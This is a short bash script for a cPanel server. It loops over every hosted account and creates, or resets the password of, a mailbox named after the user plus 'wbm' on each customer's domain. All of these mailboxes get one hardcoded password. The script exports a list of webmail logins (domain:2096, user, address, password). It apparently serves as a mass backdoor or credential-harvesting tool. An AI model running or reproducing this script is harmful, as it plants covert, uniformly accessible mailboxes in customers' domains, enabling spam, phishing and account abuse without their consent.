#!/bin/bash

# Define the output file
output_file="results.txt"

# Clear the output file if it exists
> "$output_file"

# Set the fixed password
password="Y1OFGBis8T0sAkfZ"

# Loop through each cPanel user
for cpanel_user in $(ls /var/cpanel/users); do
    # Get the primary domain for the user
    domain=$(grep '^DNS=' /var/cpanel/users/$cpanel_user | cut -d'=' -f2)

    # Create the email account using the desired format
    email_address="${cpanel_user}wbm"  # Format: username + "wbm"
    
    # Check if the email account already exists
    email_exists=$(uapi --user="$cpanel_user" Email list_pops | grep -w "${email_address}@${domain}")

    if [ -n "$email_exists" ]; then
        # If the email account exists, update the password
        uapi --user="$cpanel_user" Email passwd_pop email="$email_address" domain="$domain" password="$password"
        
        if [ $? -eq 0 ]; then
            echo "Updated password for existing email account: ${email_address}@${domain}"
            echo "${domain}:2096 | ${cpanel_user} | ${email_address}@${domain} | $password (Password Updated)" >> "$output_file"
        else
            echo "Failed to update password for user: $cpanel_user"
        fi
    else
        # If the email account does not exist, create it with the 50 MB quota
        uapi --user="$cpanel_user" Email add_pop email="$email_address" password="$password" domain="$domain" quota=50
        
        if [ $? -eq 0 ]; then
            echo "Created email account: ${email_address}@${domain} with password: $password"
            echo "${domain}:2096 | ${cpanel_user} | ${email_address}@${domain} | $password" >> "$output_file"
        else
            echo "Failed to create email account for user: $cpanel_user"
        fi
    fi
done

echo "Results have been exported to $output_file."
